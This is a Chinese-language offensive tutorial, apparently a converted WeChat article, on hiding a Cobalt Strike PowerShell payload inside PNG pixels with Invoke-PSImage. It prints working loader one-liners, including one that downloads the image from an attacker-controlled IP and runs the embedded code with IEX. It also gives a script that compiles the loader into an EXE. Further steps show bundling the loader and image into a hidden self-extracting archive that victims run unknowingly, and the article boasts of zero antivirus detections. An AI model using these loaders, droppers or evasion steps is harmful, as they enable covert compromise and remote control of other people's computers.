<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/X5jyqaEEoSQGRWwoBq2YwA)

前言
--

本篇文章将演示利用隐写术将 Shellcode 隐写入 PNG 图片 RGB 像素中，从而隐藏后门代码，并进行远程加载控制目标主机。

实战演示
----

需要使用 Invoke-PSImage 工具：

• 项目地址：https://github.com/peewpw/Invoke-PSImage

首先使用 Cobalt Strike 生成 Powershell 类型（.ps1）的

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdARl1ziciakqZeibe4BPjam719bsO5qMqky7ib7lQdCvGXUAXoQwLe1CqHw/640?wx_fmt=png)image-20210921133427498

然后将刚才生成的 payload.ps1 文件放在 Invoke-PSImage 项目内，再准备一张图片用于生成一张带有 Shellcode 的图片，二者与 Invoke-PSImage.ps1 文件在同一目录：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsd5y1wcMVibibHmQ7Hvu63RZ8ujcichp6iaEiciaF2gteelGSH0op1AyJfnBLg/640?wx_fmt=png)image-20210921162356384

### 远程加载

执行以下命令即可生成一个带有 Shellcode 的图片 shell.png：

```
# 设置执行策略Set-ExecutionPolicy Unrestricted -Scope CurrentUser# 导入 Invoke-PSimage.ps1 文件Import-Module .\Invoke-PSimage.ps1# 生成带有 Shellcode 的图片Invoke-PSImage -Script .\payload.ps1 -Image .\origin.jpg -Out .\shell.png -Web
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdgNzHCubfzEZL7MwSEIK7SM1Ir3MCicTiccl13U0g3Yu6JM818K1oHfvA/640?wx_fmt=png)image-20210921162516197

执行之后得到一串代码：

```
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://example.com/shell.png"));$o=a Byte[] 5120;(0..1)|%{foreach($x in(0..2559)){$p=$g.GetPixel($x,$_);$o[$_*2560+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))\}\};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3550]))
```

并且会得到带有 Shellcode 的图片 shell.png：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdBTHd7ysVVLZLu5x6cLbiaicgHZd5Bw4wLAwhtiar22ZrNE8VF3dJwdUicw/640?wx_fmt=png)image-20210921162640820

接着，我们在自己的 VPS 上开启一个 Web 服务，用于托管得到的 shell.png：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdgoDJm4WhX1zicZS5z4Qce4uvg52icAJc2U16O8k9zIMicmoJFzr1qHt1A/640?wx_fmt=png)image-20210921135950506

然后将上面得到的代码中的 `http://example.com/shell.png` 改为我们自己的 Web 服务地址：

```
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://47.101.57.72/shell.png"));$o=a Byte[] 5120;(0..1)|%{foreach($x in(0..2559)){$p=$g.GetPixel($x,$_);$o[$_*2560+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))\}\};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3550]))
```

在目标主机上执行这段代码后目标机成功上线：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdMgRgH4bPRYaicbyxczXLoRwU3XZnT4xibGEwqlhPbRBRaAng2d3zgsGA/640?wx_fmt=png)image-20210921163837141

我们还可以将上面那段加载的命令编译生成可执行文件，这里我们直接使用网上找的脚本进行编译：

•Convert-PS1ToExe.ps1

```
function Convert-PS1ToExe{    param(    [Parameter(Mandatory=$true)]    [ValidateScript({$true})]    [ValidateNotNullOrEmpty()]       [IO.FileInfo]$ScriptFile    )    if( -not $ScriptFile.Exists)    {        Write-Warning "$ScriptFile not exits."        return    }     [string]$csharpCode = @'    using System;    using System.IO;    using System.Reflection;    using System.Diagnostics;    namespace LoadXmlTestConsole    {        public class ConsoleWriter        {            private static void Proc_OutputDataReceived(object sender, System.Diagnostics.DataReceivedEventArgs e)            {                Process pro = sender as Process;                Console.WriteLine(e.Data);            }            static void Main(string[] args)            {                // Set title of console                Console.Title = "Powered by PSTips.Net";                 // read script from resource                Assembly ase = Assembly.GetExecutingAssembly();                string scriptName = ase.GetManifestResourceNames()[0];                string scriptContent = string.Empty;                using (Stream stream = ase.GetManifestResourceStream(scriptName))                using (StreamReader reader = new StreamReader(stream))                {                    scriptContent = reader.ReadToEnd();                }                 string scriptFile = Environment.ExpandEnvironmentVariables(string.Format("%temp%\\{0}", scriptName));                try                {                    // output script file to temp path                    File.WriteAllText(scriptFile, scriptContent);                     ProcessStartInfo proInfo = new ProcessStartInfo();                    proInfo.FileName = "PowerShell.exe";                    proInfo.CreateNoWindow = true;                    proInfo.RedirectStandardOutput = true;                    proInfo.UseShellExecute = false;                    proInfo.Arguments = string.Format(" -File {0}",scriptFile);                     var proc = Process.Start(proInfo);                    proc.OutputDataReceived += Proc_OutputDataReceived;                    proc.BeginOutputReadLine();                    proc.WaitForExit();                    Console.WriteLine("Hit any key to continue...");                    Console.ReadKey();                }                catch (Exception ex)                {                    Console.WriteLine("Hit Exception: {0}", ex.Message);                }                finally                {                    // delete temp file                    if (File.Exists(scriptFile))                    {                        File.Delete(scriptFile);                    }                }             }         }    }'@     # $providerDict    $providerDict = New-Object 'System.Collections.Generic.Dictionary[[string],[string]]'    $providerDict.Add('CompilerVersion','v4.0')    $codeCompiler = [Microsoft.CSharp.CSharpCodeProvider]$providerDict     # Create the optional compiler parameters    $compilerParameters = New-Object 'System.CodeDom.Compiler.CompilerParameters'    $compilerParameters.GenerateExecutable = $true    $compilerParameters.GenerateInMemory = $true    $compilerParameters.WarningLevel = 3    $compilerParameters.TreatWarningsAsErrors = $false    $compilerParameters.CompilerOptions = '/optimize'    $outputExe = Join-Path $ScriptFile.Directory "$($ScriptFile.BaseName).exe"    $compilerParameters.OutputAssembly =  $outputExe    $compilerParameters.EmbeddedResources.Add($ScriptFile.FullName) > $null    $compilerParameters.ReferencedAssemblies.Add( [System.Diagnostics.Process].Assembly.Location ) > $null     # Compile Assembly    $compilerResult = $codeCompiler.CompileAssemblyFromSource($compilerParameters,$csharpCode)     # Print compiler errors    if($compilerResult.Errors.HasErrors)    {        Write-Host 'Compile faield. See error message as below:' -ForegroundColor Red        $compilerResult.Errors | foreach {            Write-Warning ('{0},[{1},{2}],{3}' -f $_.ErrorNumber,$_.Line,$_.Column,$_.ErrorText )        }    }    else    {         Write-Host 'Compile succeed.' -ForegroundColor Green         "Output executable file to '$outputExe'"    \}\}
```

首先将那段用于加载 Shellcode 的命令写入文件 Loader.ps1 中：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdCAywFKGTPgTVP1g8fLatFUb3HdayX0aBicWjRlLAytawFjOtib1UJR6A/640?wx_fmt=png)image-20210921171459111

然后执行以下命令，使用 Convert-PS1ToExe.ps1 将 Loader.ps1 编译成 EXE：

```
Import-Module .\Convert-PS1ToExe.ps1Convert-PS1ToExe -ScriptFile .\Loader.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdUY8NomXL5yBtD9O189ia3QicB4HibwMLicHX7bADLicmPRCwxsBOUajKsJw/640?wx_fmt=png)image-20210921171759257

将生成的 exe.jpg 上传到目标主机并执行：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdPHLNEib1Bia1JsBtTicnUJV6Qd6icBib8rcOAhicMI42X45A1SzHGOicY92oQ/640?wx_fmt=png)image-20210921172516131

如上图所示，目标机成功上线。美中不足的是有个弹窗。

使用远程加载固然方便，但是由于生成的图片非常大，远程加载所耗的时间较长，所以我们可以尽可能的本地加载。

### 本地加载

执行以下命令即可生成一个带有 Shellcode 的图片 shell.png：

```
# 设置执行策略Set-ExecutionPolicy Unrestricted -Scope CurrentUser# 导入 Invoke-PSimage.ps1 文件Import-Module .\Invoke-PSimage.ps1# 生成带有 Shellcode 的图片Invoke-PSImage -Script .\payload.ps1 -Image .\origin.jpg -Out .\shell.png
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdpKo91uXM8kzEBIb0iaFCceJAw18sDtJJppMAdQVLMt17KYS48iafdiaPw/640?wx_fmt=png)image-20210921164514521

如上图所示，生成了包含 Shellcode 的图片 shell.png 与加载 Shellcode 使用的代码：

```
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap(".\shell.png");$o=a Byte[] 5120;(0..1)|%{foreach($x in(0..2559)){$p=$g.GetPixel($x,$_);$o[$_*2560+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))\}\};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3550]))
```

执行上面的命令，在本地加载图片里的 Shellcode：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdHYrFAfSNxbBDgghR0L7QjcpEWqcZYkZmRniakdLWviagFknXZJzmwUBA/640?wx_fmt=png)image-20210921165619277

如上图所示，成功上线。

下面，我们将这种本地加载中的加载命令也用之前的方式编译成可执行文件：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdGRo2JQkY5Fb0tpWqASXhLQyzrp2hF5JPk3180lSEoibJrNIB9KStiaLQ/640?wx_fmt=png)image-20210921172946177![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsddZpzuGw1olf0DOVk1h16G59EibtDMibicc8cWw9Kq8jy476H0Jj0Dk5gg/640?wx_fmt=png)image-20210921173310693

此时执行 Loader.exe 便可以加载 shell.png 中的 Shellcode，但二者必须在同一目录下。为了方便，我们还需要完善一下。

这里我们参考使用 WinRAR 自解压捆绑木马的思路，将 shell.png 和 Loader.exe 压缩在一起，并设置成自解压格式，那么当用户运行时，二者便会被解压到相同的目录并自动执行 Loader.exe。

首先，选中这两个文件，鼠标右键，将这两个文件添加到压缩文件。点击 “创建自解压格式压缩文件”，此时 rar 就会变成 exe 后缀的文件：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsd3VygMTDMVjGpaptHicOMmrmOxbote4FmyUd4FibW5eU5KGP8RP0EIyEQ/640?wx_fmt=png)image-20210921174134274![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdasJRYLI4YsxuiaFjte7R8sGMQm7aTeogSUkxS2Not80ykOTUVNzxQ2g/640?wx_fmt=png)image-20210921174438232

然后点击 “高级”—>“自解压文件选项”—>“常规”：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdm6UQtEiaxGE9xYcoJyZEicr1cTDhWdumbKPpic68V32gUfVQvgiaX7U0ZA/640?wx_fmt=png)image-20210921174516416

设置解压后文件的存储路径为 `C:\WINDOWS\Temp`：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdf1QI8Nadic0EJOjDWaMjS90PB3nNgibaTw0GqWjHBMIM1eFKo2avQcyg/640?wx_fmt=png)image-20210921174653293

然后，进入 “安装”（有的版本也叫 “设置”），填入解压完成后需要执行的程序：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdUag4AicEkjPrO6r0pvqWRSUlDy17LRnDaLQqQKbYhG5HnnnmOqTtJug/640?wx_fmt=png)image-20210921174800415

然后，进入 “模式”，选择模式为 “全部隐藏”：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdy1umEn9RFsUSDHm44r5XgcnNS60YUkMgh98C5Jw7zyibANpCsAYeloA/640?wx_fmt=png)image-20210921174837149

然后，进入 “更新”，将更新方式设置为 “解压并更新文件”，覆盖方式设置为 “覆盖所有文件”：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdeGEjYPbMia06hfWQt6c4Eo0c78puMzo4gP3e1RIzfPrZyXOEyKfHa4A/640?wx_fmt=png)image-20210921174937701

最后点击确定，即可生成一个 Desktop.exe 的文件：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsd2QibYeFwnnCKjETuCia2zFHkZjCuKjmMZOxwZDvPQTkJWTDKKChDwc4Q/640?wx_fmt=png)image-20210921175013158

运行 Desktop.exe 即可成功上线：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdj9rp7bd8QEwWA2xOJQ9m6RuKznFKRaypD5xbGJicufFSRrro3h6uoTA/640?wx_fmt=png)image-20210921175436599

免杀测试
----

将生成的 shell.png 扔到 virustotal 上面去测试，查杀率为 0/57：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9zmkDWibMu3JNqAb3SW3nsdktAp6nX5KfllAzBZaeTwT0gRiaPj2PlAdPahhcfb6IBo4kFNCwVG6Og/640?wx_fmt=png)image-20210921181509806

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**点赞    在看    转发**

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)